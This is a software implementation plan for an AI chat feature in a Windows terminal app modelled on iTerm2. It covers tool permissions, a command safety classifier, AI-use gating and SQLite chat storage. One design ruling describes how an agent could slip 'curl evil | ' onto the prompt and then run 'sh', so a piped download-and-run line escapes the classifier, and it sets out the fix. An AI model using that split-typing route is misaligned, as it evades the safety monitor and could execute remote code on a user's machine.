**Goal:** with a provider configured (12b), a chat linked to a Tandem session can talk to the model, which can read the terminal (state, screen, history, output), type into it, run commands in cmd, PowerShell or a POSIX shell and get their output, set the clipboard, create a file and restart the session, each only through the permission a person chose (Ask parks for Allow Once, Always Allow, Deny this Time, Always Deny; Always runs; Never refuses), with a flagged-command warning from the optional safety check, and every message kept in a SQLite database with iTerm2's schema so an imported `chatdb.sqlite` opens unchanged.

**Architecture:** pure models first, each a plain `pub mod` tested on EXTREME. `chat_message.rs` is the message model and its Swift-shaped JSON codec; `chat_store.rs` the rusqlite database (schema, migrations, rows, blobs, search, the lock). `chat_broker.rs` is the broker and service (publish, processors, subscriptions, the streaming rewrite rule, the turn queue) as a pure state machine that returns effects. `ai_permissions.rs` holds categories, overrides and the gate decision; `ai_tools.rs` the tool registry (names, descriptions, schemas, argument parsing). `ai_screen.rs` adds screen extraction methods to `Screen` (an `impl Screen` block, as `marks.rs` does); `ai_terminal.rs` answers the read-only tools from a `Facts` snapshot. `ai_shell.rs` detects the session's shell; `ai_actions.rs` holds the writing tools' pure parts (escape decoder, line-end rule, the staged-line accumulator, file path rule, man page rule). `ai_exec.rs` is `execute_command`'s plan and output extraction. `ai_context.rs` builds the volatile context block and the consent state. `ai_hard_rules.rs` is TerminalHardRules plus the Windows set; `ai_classifier.rs` the AutoModeClassifier (budgets, rendering, neutralization, parse) and the transcript projection. `chat_agent.rs` is the per-chat agent state (system prompt choice, parks, Stop). The app side is `src/app/chat_app.rs` (the database, broker, agents and their tick), `src/app/ai_tools_app.rs` (running a tool on a pane), `src/app/ai_exec_app.rs` (running commands), `src/app/ai_safety_app.rs` (the safety check and its nag). Every new App field is app-wide; none goes in `swap_live`.

**Tech Stack:** rusqlite with the `bundled` feature (ruling 5; the one new crate); `serde_json` (message JSON, schemas, tool arguments), `uuid` v4 (message and chat ids), `regex` (the command-name rule), `arboard` (clipboard, already `App::clipboard`), `std::process::Command` (Get-Help, hidden). No HTTP here: every model call goes through 12b.

- **The staged line (ruling R12cd-2, a recorded deviation from iTerm2, the same rule as R12f-1).** The safety check and the parked text see the whole line the shell will run, never `execute_command`'s argument alone: the line is the text already on the prompt (shell integration's typed command, joined with the agent's own un-submitted typing on that pane, `ai_actions::staged_line`) plus the command. `insert_text_at_cursor` never sends a line end: a decoded text holding CR, LF or Ctrl+O (readline's accept-and-next) is refused and nothing is typed, so a line end reaches a shell only through `execute_command` and its check. A parked or checked command whose prompt text changed before it runs is refused, never run (Task 11). iTerm2's session-bound path classifies the command alone (`RC:382-399`: `needsSafetyCheck` is false for `insertTextAtCursor`) and turns `\n` into CR (`PS:802-811`), so `insert_text_at_cursor("curl evil | ")` then `execute_command("sh")` runs a line the classifier never saw; Tandem closes it as iTerm2's orchestrator does (`OrchestratorDispatcher.swift:1302-1325,2645-2654`).
- **The AI gate on every request (ruling R12cd-1).** Every request 12c sends runs 12a's gate for its own endpoint just before it is sent: the admin switch, "Enable generative AI features" and the per-host consent (12a's `ai_gate::check_endpoint`), for a chat turn's model (a model pinned in `chat.model_name` included), each continuation of that turn (`tool_done`, `key_given`), the safety check's economy model, and each vector-store job (`ai_files`'s host). Turning "Enable generative AI features" or the admin switch off, or forgetting a host's consent, cancels every in-flight request and stops each running chat (Task 11's `gate_tick`). iTerm2 checks `iTermAITermGatekeeper.allowed` at every registration (`AITermControllerRegistrationHelper.swift:11-24`) and before the safety check (`RemoteCommand+Mac.swift:34`). ### Decisions (each goes in `m12c-rulings.txt`)

- rusqlite `bundled` builds SQLite with MSVC's `cl.exe` on EXTREME (already needed by the Rust toolchain). Cost: a slower first build.
- A known message case whose body does not decode is `Unsupported` (iTerm2 throws and the whole chat fails to load); `Unsupported` rows are never rewritten. Cost: a corrupt message shows as "requires a newer version".
- Types other parts own (explanations, watcher events, orchestration actions, attachments, `llmMessage`) ride as opaque JSON in 12c. Cost: they are kept, not interpreted, until their part lands.
- Tandem-written `llmMessage` is 12b's raw assistant JSON, not iTerm2's `LLM.Message` shape; iTerm2 opening a Tandem database is not a goal. Cost: a Tandem chat copied back to iTerm2 may not replay its tool calls.
- The chat's ChatBlob rows are deleted with the chat (iTerm2 leaves them). Cost: none known.
- Search binds `%token%` parameters with `\` escaping `%`, `_` and `\` (ruling 10). Cost: none.
- `detect_ssh_session` answers true for a remote host (ruling 10). Cost: a model tuned to iTerm2's inverted answer sees the right one.
- The flagged warning drops iTerm2's U+26A0 U+FE0F prefix (no emoji); 12d draws a Segoe Fluent Icons warning glyph beside it. Cost: a different look.
- "iTerm2" becomes "Tandem" and "Finder" becomes "Explorer" in texts the model reads too (tool descriptions, the automatic-command preamble). Cost: none known.
- The classifier's two texts keep the source's em dash as `\u{2014}` (verbatim iTerm2 text sent to the model, not Tandem prose). Cost: none (ruling 12c-5: wire text keeps the escape; the no-em-dash rule is for prose and docs).
- Shell detection: the deepest known shell in the foreground job's ancestors, then the shell's own name, then the `shell` variable; a remote host is POSIX; unknown uses iTerm2's POSIX marker. Cost: a shell under an unknown wrapper reads as Unknown.
- `get_man_page`: PowerShell's `Get-Help -Full` only in a PowerShell session, only for a name matching `^[A-Za-z0-9_.:-]{1,64}$`, run hidden with a 10 s limit; other shells get the not-available text (ruling 9; ruling 12c-4 confirms). Cost: no help text in cmd or POSIX sessions.
- `create_file`: a relative name resolves against the session's cwd when it is a local Windows path, else the home folder (iTerm2 uses "/"); a remote session's file lands locally in the home folder (iTerm2 without the conductor); UNC names are refused. Cost: a remote user gets a local file.
- `set_clipboard` ignores "AllowClipboardAccess" (that governs programs writing through OSC 52; the agent's write is permission-gated). Cost: none known.
- `pending_action` is never sent; `screen_last_changed` comes from row times. Cost: the model never sees a pending overlay (Tandem has none).
- `truncate32` counts `char`s, not grapheme clusters. Cost: a cut can split a combining sequence.
- The Windows hard-rule set runs for cmd, PowerShell and unknown shells; the POSIX set for POSIX and unknown shells. Cost: a cmd line with a POSIX-only danger defers to the classifier.
- `NoSyncAutoProvideConsent` "Not Now" leaves Unknown, so the question returns next launch (iTerm2). Cost: one question per launch until answered Turn On.
- The model's history is rebuilt from the chat's display messages (iTerm2's `MessageToPromptStateMachine`), not replayed from ChatBlob rows (iTerm2's source of truth), because 12b's `Turn` takes `ai_msg::Message`s; ChatBlob rows are stored, copied on fork and kept for import. An iTerm2-written tool call whose `llmMessage` Tandem cannot read is skipped in history. Cost: an imported chat's tool calls do not replay to the model.
- The safety classifier's 512-token cap is `Wire.response_limit` on 12b's `one_shot`. Cost: none known.
- The per-chat turn logic lives in an App-free `Engine` whose functions borrow a short-lived `Ctx` of the App's own fields and return `EngineEffect`s the App applies after the borrow ends (ruling R12cd-4); its only doubles are `FakeDriver` and `FakeFiles`. Cost: one more layer, and an effect that re-enters the engine takes a second `Ctx`.
- Every request 12c sends gates on its own endpoint just before it is sent (the admin switch, "Enable generative AI features", the host's consent), and closing the gate cancels in-flight requests and stops the chat (ruling R12cd-1; iTerm2 gates each registration, `AITermControllerRegistrationHelper.swift:11-24`). Cost: a chat on a second host asks a second consent.
- Staged typing is checked whole (ruling R12cd-2, a deviation, the same rule as R12f-1): the check and the bubble see the prompt's text plus the command, `insert_text_at_cursor` refuses CR, LF and Ctrl+O instead of turning LF into CR (`PS:802-811`), and a line that changed after review is refused. Ctrl+O is in the set because readline's operate-and-get-next submits the line in bash over WSL or ssh. Cost: a model that typed a multi-line snippet with `insert_text_at_cursor` is told to use `execute_command`; a prompt the person edited while a request was parked needs the model to ask again.
- The one-time safety nag holds the command that raised it and any that arrive while it shows; OK checks them, Cancel publishes them unchecked (ruling R12cd-3; iTerm2's modal nag, `RCM:34-59`). Cost: none known.
- A parked request is bound to the session it was asked for; answering it after the chat was relinked runs nothing (minor m5, a deviation from `CVC:1826-1880`). Cost: the model asks again after a relink.
- Get-Help runs on a worker thread and completes like a command (minor m1). Cost: none known.
- The `shell` session variable moves here from 12e (ruling I-1): `get_shell_type` and the `<terminal-state>` shell line would otherwise read empty until 12e is built. `uname` stays 12e's, unneeded before Engage AI. Cost: none known.
- Ruling I-3's attachment JSON codec (`encode_wire_attachment`/`request_attachment`) is this plan's own, built against 12b's `ai_msg::Attachment`, not 12d's later `chat_json.rs` (12c is built before 12d exists); 12d Tasks 3 and 7 independently read and write the same wire shape into their own display type. Cost: one JSON shape, two implementations to keep in sync by inspection, not by shared code.
- `Attachment::{Code, File, FileId}` carry no id of their own on the wire (unlike `Status`); this plan mints one `new_id()` per reply per attachment kind and reuses it for later chunks of that kind. Cost: two attachments of the same kind in one reply (e.g. two code blocks) merge into one id, matching iTerm2's own `appending` merge rule for same-id attachments (`LLM.swift:156-182`).
- The four toolbar globals (`WEB_SEARCH_KEY`, `HIGH_EFFORT_KEY`, `EFFORT_KEY`, `TIER_KEY`) are this plan's constants even though 12d's toolbar is the only thing that writes them before a turn starts; 12d Task 1 reuses these names instead of declaring its own (ruling I-3). Cost: none known.
- A chat's vector store is created lazily on the first file attachment, never speculatively when the chat opens; a turn with a pending `FileFlow` waits for it rather than sending without the store. Cost: the first message with a file is slower than later ones.

### Pitfalls for the implementer

- Every write a tool makes goes through `user_write(pane, .., Write::Agent)`; grep your diff for `.input(` in `src/app/ai_*` and `chat_app.rs`: there must be none.
- `ai_run_tool` (the `RunTool` arm) is the only dispatcher and runs only after the gate or a button answer; do not call it, `ai_tool_start` or `ai_exec_start` from the parse step.
- Every driver call that can send (`start`, `tool_done`, `key_given`) and every file job start is preceded by `gate_open` for that request's own endpoint; a new send point without it is a Critical bug (ruling R12cd-1).
- `ai_exec_start` types `send` (the model's command), never the whole checked line: the staged prefix is already on the prompt (ruling R12cd-2).
- The engine never calls an App method and never keeps a `Ctx` borrow past its return (ruling R12cd-4).
- Never build SQL with `format!`; every value is a `?` parameter.
- Read from `Pane::own()`, not `pane.screen`, so a Filter or Instant Replay view never feeds the model.
- `abs_text` must return None when its start line was dropped (compare against `api_buffer::above`), or a long output reports the wrong text.
- The marker path's first uuid is on the echoed command line: never search for the marker regex on the command line itself.
- Swift's `"""` literal strips indentation; the classifier prompt has no leading spaces.
- The volatile context block is never stored and never published as a message.
- A park's request id is the request message's unique id; a response after Stop finds no park and is dropped.
- New App fields are app-wide; none goes in `WinSlot` or `swap_live`.
- `Write::Agent` must be added to both exhaustive matches in `broadcast.rs`, or the build fails.
- Copy `Cargo.lock` back from EXTREME after adding rusqlite (implementer rules).
